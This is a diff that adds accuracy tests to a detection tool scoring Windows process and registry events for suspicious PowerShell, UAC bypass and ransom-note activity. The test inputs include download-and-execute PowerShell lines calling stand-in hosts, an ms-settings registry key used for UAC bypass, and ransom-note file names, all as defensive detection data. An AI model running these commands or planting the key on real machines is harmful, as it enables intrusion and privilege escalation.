@@ -298,3 +298,47 @@ def test_esc_shows_markdown_links_and_images_as_text():
     assert "<code>https://evil.example/x" in link
     assert esc("https://a.example/x_y z") == "<code>https://a.example/x&#95;y</code> z"   # the URL stays whole
     assert esc("<b>a</b>\nb $x$") == "&lt;b&gt;a&lt;/b&gt;<br>b &#36;x&#36;"
+
+
+# ---------- Block 5: accuracy ----------
+
+def ps_strength(script):
+    events = [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{p}", Image=PS, ParentProcessGuid="{d}",
+                    ParentImage=USER + "\\Downloads\\helper.exe", CommandLine="powershell -c " + script)]
+    return strengths(events, "suspicious_powershell")
+
+
+def test_powershell_curl_and_wget_count_as_downloads():
+    assert ps_strength("curl https://x.example/a.txt -OutFile a.txt") == ["Weak"]
+    assert ps_strength("iex (wget https://x.example/a.ps1).Content") == ["Strong"]
+
+
+def test_official_package_manager_installers_are_low():
+    choco = ("iex ((New-Object System.Net.WebClient).DownloadString("
+             "'https://community.chocolatey.org/install.ps1'))")
+    assert ps_strength(choco) == ["Weak"]
+    assert ps_strength("irm get.scoop.sh | iex") == ["Weak"]
+    assert ps_strength("irm https://scoop.example.net/x | iex") == ["Strong"]   # any other source
+
+
+def test_uac_bypass_key_in_the_classes_form_is_strong():
+    events = [event(1, 13, "2026-02-01 09:00:00.000", ProcessGuid="{u}", Image=USER + "\\Downloads\\u.exe",
+                    TargetObject="HKU\\S-1-5-21-0_Classes\\ms-settings\\shell\\open\\command\\(Default)",
+                    Details="C:\\Users\\Public\\u.exe")]
+    assert strengths(events, "uac_bypass") == ["Strong"]
+
+
+def test_ransom_note_names_and_paths_with_spaces():
+    def opened(command):
+        return [event(1, 1, "2026-02-01 09:00:00.000", ProcessGuid="{n}", Image=SYS + "notepad.exe",
+                      ParentImage=USER + "\\Downloads\\x.exe", CommandLine=command)]
+    assert "ransom_note" in checks_fired(opened("notepad.exe C:\\Users\\Public\\RESTORE_MY_FILES.txt"))
+    assert "ransom_note" in checks_fired(opened("notepad.exe C:\\Users\\a\\Desktop\\HOW TO RECOVER.txt"))
+    assert "ransom_note" not in checks_fired(opened("notepad.exe C:\\Program Files\\App\\readme.txt"))
+
+
+def test_a_normal_it_day_is_not_malicious():
+    from tests.fixtures.events import it_day_events
+    findings = run_checks(it_day_events())
+    assert make_verdict(findings)["label"] != "Malicious"
+    assert findings == []   # in fact nothing in it needs a look
